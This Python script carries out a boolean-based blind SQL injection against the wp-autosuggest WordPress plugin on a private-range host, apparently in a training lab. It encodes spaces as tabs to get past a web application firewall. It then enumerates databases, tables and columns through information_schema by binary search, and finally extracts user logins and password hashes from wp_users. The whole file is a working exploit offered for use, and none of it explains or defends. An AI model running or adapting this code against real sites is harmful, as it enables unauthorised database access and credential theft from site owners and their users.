import requests
import string

def boolean_based_blind(condition):
    condition = condition.replace(" ","%09") # Bypass WAF
    url_a = r"http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys="
    url_b = r"%25%27)%09and%09"
    url_c = r"%09--%09-"
    url = url_a + url_b + condition + url_c
    
    # print(f"""SELECT * FROM $wpdb->posts WHERE (post_title LIKE '%{url_b + condition + url_c}%') AND post_status = 'publish' ORDER BY post_date DESC");""")
    # print(url)

    res = requests.get(url).text

    if len(res) > 100:
        return True
    else:
        return False
"""
print(boolean_based_blind("1=0")) # Return False
print(boolean_based_blind("1=1")) # Return True
"""

##########################################################################
##########################################################################
########################## Dump DB Info ##################################
##########################################################################
##########################################################################

# 1.1 check DB Size
def db_size_binary_search(left=1,right=20):
    right_condition = "(SELECT COUNT(DISTINCT(schema_name)) FROM information_schema.schemata)"
    while right - left > 3 : # <= 3 Will stop
        guess = int(left+(right-left)/2)
        if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
            right = guess
        else: # False, means guess <= answer
            left = guess
        print(f"{left} ~ {right}",end="   \r")

    for i in range(left,right): # do match
        print(f"Testing {i}",end='   \r')
        if boolean_based_blind(f"({i}={right_condition})"):
            print(f"The db size is {i}")
            return i
    
# 1.2 DB Name Len
def count_db_name_len(db_counts):
    db_name_lens = []
    def db_name_len_binary_search(db_num,left=1,right=50):
        right_condition = f"(SELECT LENGTH(schema_name) FROM information_schema.schemata LIMIT {db_num},1)"
        while right - left > 3 : # <= 3 Will stop
            guess = int(left+(right-left)/2)
            if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
                right = guess
            else: # False, means guess <= answer
                left = guess
            print(f"{left} ~ {right}",end="   \r")

        for i in range(left,right): # do match
            print(f"Testing {i}",end='   \r')
            if boolean_based_blind(f"({i}={right_condition})"):
                print(f"The len(db[{db_num}].name) is {i}")
                return i
    for db_num in range(db_counts):
        db_name_lens.append(db_name_len_binary_search(db_num=db_num))
    return db_name_lens

# 1.3 DB Name
def dump_db_name(db_num,db_name_len):
    ans = ""
    def db_name_binary_search(db_num,db_name_index,left=32,right=127): # ascii range 32~127
        right_condition = f"(SELECT ASCII(SUBSTRING(schema_name,{db_name_index},1)) FROM information_schema.schemata LIMIT {db_num},1)"
        while right - left > 3 : # <= 3 Will stop
            guess = int(left+(right-left)/2)
            if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
                right = guess
            else: # False, means guess <= answer
                left = guess
            print(f"{left} ~ {right}",end="   \r")

        for i in range(left,right): # do match
            print(f"Testing {i}",end='   \r')
            if boolean_based_blind(f"({i}={right_condition})"):
                print(f"db[{db_num}].name[{db_name_index}] is {chr(i)}")
                return chr(i)

    for db_name_index in range(1,db_name_len+1):
        ans += db_name_binary_search(db_num=db_num,db_name_index=db_name_index)
    print(f"db[{db_num}].name = {ans}")
    return ans


##############################

# 2.1 Table size
def table_size_binary_search(db_name,left=1,right=100):
    right_condition = f"(SELECT COUNT(DISTINCT(table_name)) FROM information_schema.tables WHERE table_schema='{db_name}')"
    while right - left > 3 : # <= 3 Will stop
        guess = int(left+(right-left)/2)
        if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
            right = guess
        else: # False, means guess <= answer
            left = guess
        print(f"{left} ~ {right}",end="   \r")

    for i in range(left,right): # do match
        print(f"Testing {i}",end='   \r')
        if boolean_based_blind(f"({i}={right_condition})"):
            print(f"The table size is {i}")
            return i
    

# 2.2 Table name len
def count_table_name_len(db_name,table_counts):
    ret = []
    def db_name_len_binary_search(db_name,table_num,left=1,right=50):
        right_condition = f"(SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {table_num},1)"
        while right - left > 3 : # <= 3 Will stop
            guess = int(left+(right-left)/2)
            if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
                right = guess
            else: # False, means guess <= answer
                left = guess
            print(f"{left} ~ {right}",end="   \r")

        for i in range(left,right): # do match
            print(f"Testing {i}",end='   \r')
            if boolean_based_blind(f"({i}={right_condition})"):
                print(f"The len({db_name}.table[{table_num}]) is {i}")
                return i
                
    for table_num in range(table_counts):
        ret.append(db_name_len_binary_search(db_name=db_name,table_num=table_num))
    return ret


# 2.3 dump_table_name
def dump_table_name(db_name,table_num,table_name_len):
    ans = ""
    def table_name_binary_search(table_num,table_name_index,db_name,left=32,right=127): # ascii range 32~127
        right_condition = f"(SELECT ASCII(SUBSTRING(table_name,{table_name_index},1)) FROM information_schema.tables where table_schema='{db_name}' LIMIT {table_num},1)"
        while right - left > 3 : # <= 3 Will stop
            guess = int(left+(right-left)/2)
            if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
                right = guess
            else: # False, means guess <= answer
                left = guess
            print(f"{left} ~ {right}",end="   \r")

        for i in range(left,right): # do match
            print(f"Testing {i}",end='   \r')
            if boolean_based_blind(f"({i}={right_condition})"):
                print(f"{db_name}.table[{table_num}][{table_name_index}] is {chr(i)}")
                return chr(i)

    for table_name_index in range(1,table_name_len+1):
        ans += table_name_binary_search(table_num=table_num,table_name_index=table_name_index,db_name=db_name)
    print(f"{db_name}.table[{table_num}] = {ans}")
    return ans


##############################


# 3.1 Column size
def column_size_binary_search(db_name,table_name,left=1,right=100):
    right_condition = f"(SELECT COUNT(DISTINCT(column_name)) FROM information_schema.columns WHERE table_name='{table_name}' and table_schema='{db_name}')"
    while right - left > 3 : # <= 3 Will stop
        guess = int(left+(right-left)/2)
        if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
            right = guess
        else: # False, means guess <= answer
            left = guess
        print(f"{left} ~ {right}",end="   \r")

    for i in range(left,right): # do match
        print(f"Testing {i}",end='   \r')
        if boolean_based_blind(f"({i}={right_condition})"):
            print(f"The {db_name}.{table_name} column size is {i}")
            return i

# 3.2 Column name len
def count_column_name_len(db_name,table_name,column_counts):
    ret = []
    def column_name_len_binary_search(db_name,table_name,column_num,left=1,right=50):
        right_condition = f"(SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='{table_name}'and table_schema='{db_name}' LIMIT {column_num},1)"
        while right - left > 3 : # <= 3 Will stop
            guess = int(left+(right-left)/2)
            if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
                right = guess
            else: # False, means guess <= answer
                left = guess
            print(f"{left} ~ {right}",end="   \r")

        for i in range(left,right): # do match
            print(f"Testing {i}",end='   \r')
            if boolean_based_blind(f"({i}={right_condition})"):
                print(f"The len({db_name}.{table_name}.column[{column_num}]) is {i}")
                return i
    for column_num in range(column_counts):
        ret.append(column_name_len_binary_search(db_name=db_name,table_name=table_name,column_num=column_num))
    return ret

# 3.3
def dump_column_name(db_name,table_name,column_num,column_name_len):
    ans = ""
    def column_name_binary_search(db_name,table_name,column_num,column_name_index,left=32,right=127): # ascii range 32~127
        right_condition = f"(SELECT ASCII(SUBSTRING(column_name,{column_name_index},1)) FROM information_schema.columns where table_name='{table_name}' and table_schema='{db_name}' LIMIT {column_num},1)"
        while right - left > 3 : # <= 3 Will stop
            guess = int(left+(right-left)/2)
            if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
                right = guess
            else: # False, means guess <= answer
                left = guess
            print(f"{left} ~ {right}",end="   \r")

        for i in range(left,right): # do match
            print(f"Testing {i}",end='   \r')
            if boolean_based_blind(f"({i}={right_condition})"):
                print(f"{db_name}.{table_name}.column[{column_num}][{column_name_index}] is {chr(i)}")
                return chr(i)

    for column_name_index in range(1,column_name_len+1):
        ans += column_name_binary_search(db_name=db_name,table_name=table_name,column_num=column_num,column_name_index=column_name_index)
    print(f"{db_name}.{table_name}.column[{column_num}] = {ans}")


##############################

# 4.1 
def select_data_counts(select_data, db_table, left=1,right=100):
    right_condition = f"(SELECT COUNT(DISTINCT({select_data})) FROM {db_table})"
    while right - left > 3 : # <= 3 Will stop
        guess = int(left+(right-left)/2)
        if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
            right = guess
        else: # False, means guess <= answer
            left = guess
        print(f"{left} ~ {right}",end="   \r")

    for i in range(left,right): # do match
        print(f"Testing {i}",end='   \r')
        if boolean_based_blind(f"({i}={right_condition})"):
            print(f"The {db_table} row size is {i}")
            return i
# 4.2
def select_data_len(select_data,db_table,row_counts):
    ret = []
    def select_data_len_binary_search(select_data,db_table,row_num,left=1,right=50):
        right_condition = f"(SELECT LENGTH({select_data}) FROM {db_table} LIMIT {row_num},1)"
        while right - left > 3 : # <= 3 Will stop
            guess = int(left+(right-left)/2)
            if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
                right = guess
            else: # False, means guess <= answer
                left = guess
            print(f"{left} ~ {right}",end="   \r")

        for i in range(left,right): # do match
            print(f"Testing {i}",end='   \r')
            if boolean_based_blind(f"({i}={right_condition})"):
                print(f"The len({db_table}[{select_data}]) is {i}")
                return i
    for row_num in range(row_counts):
        ret.append(select_data_len_binary_search(select_data=select_data,db_table=db_table,row_num=row_num))
    return ret

# 4.3
def select_data_dump(select_data, db_table,row_num,row_data_lens):
    ans = ""
    def data_dump(select_data, db_table, row_num, row_name_index, left=32,right=127): # ascii range 32~127
        right_condition = f"(SELECT ASCII(SUBSTRING({select_data},{row_name_index},1)) FROM {db_table} LIMIT {row_num},1)"
        while right - left > 3 : # <= 3 Will stop
            guess = int(left+(right-left)/2)
            if boolean_based_blind(f"({guess}>{right_condition})"): # True , means guess > answer
                right = guess
            else: # False, means guess <= answer
                left = guess
            print(f"{left} ~ {right}",end="   \r")

        for i in range(left,right): # do match
            print(f"Testing {i}",end='   \r')
            if boolean_based_blind(f"({i}={right_condition})"):
                print(f"{db_table}[{select_data}][{row_num}][{len(ans)}] is {chr(i)}")
                return chr(i)

    for row_data_index in range(1,row_data_lens+1):
        ans += data_dump(select_data = select_data , db_table=db_table ,row_name_index = row_data_index , row_num = row_num)
    print(f"{db_table}[{select_data}][{row_num}] = {ans}")
    return ans



##########################################################################
##########################################################################
##########################################################################
##########################################################################
##########################################################################


"""
###################### Part 1 DB Data ############################
# 1.1. Get DB Counts
db_size = db_size_binary_search()

# 1.2. Get DB name len
db_name_lens = count_db_name_len(db_size)
print(db_name_lens)
# Usually, len(18) can pass because they are "information_schema" or "performance_schema"

# 1.3. Get DB Name
db_names = []
for i in range(len(db_name_lens)):
    db_names.append(dump_db_name(db_num = i , db_name_len = db_name_lens[i]))
print("DB Names:" , db_names)


###################### Part 2 Table Data ############################
db_names = ['information_schema', 'mysql', 'performance_schema', 'sys', 'wordpress']
db_name = "wordpress" # Self define
# 2.1 Get Tables Count
table_size = table_size_binary_search(db_name=db_name)

# 2.2 Get Tables len
db_name_lens = count_table_name_len(db_name=db_name,table_counts=table_size)
print(db_name_lens)

db_name_lens = [14, 11, 8, 10, 11, 8, 21, 16, 11, 8, 11, 8]
# 2.3 Dump Table name
table_names = []
for table_num in range(len(db_name_lens)):
    table_names.append(dump_table_name(db_name=db_name,table_num=table_num,table_name_len=db_name_lens[table_num]))
print("Table Names:" , table_names)


###################### Part 3 Column Data ############################
db_name = "wordpress"
table_name = "wp_users"

# 3.1 Get Column Counts
column_counts = column_size_binary_search(db_name,table_name)

# 3.2 Get Column length
column_name_lens = count_column_name_len(db_name,table_name,column_counts)

# 3.3 Dump Column name
column_names = []
for column_num in range(len(column_name_lens)):
    column_names.append(dump_column_name(db_name=db_name,table_name=table_name,column_num=column_num,column_name_len=column_name_lens[column_num]))
print(column_names)
"""


###################### Part 4 Select Data ############################
# Need to modify 4.x Codes

# 4.1
db_table = "wordpress.wp_users"
select_data = "CONCAT(user_login,':',user_pass)"
row_counts = select_data_counts(select_data, db_table)

# 4.2
row_data_lens = select_data_len(select_data,db_table,row_counts)

# 4.3
result_data = []
for row_num in range(len(row_data_lens)):
    result_data.append(select_data_dump(select_data = select_data, db_table = db_table, row_num = row_num , row_data_lens = row_data_lens[row_num]))

print(result_data)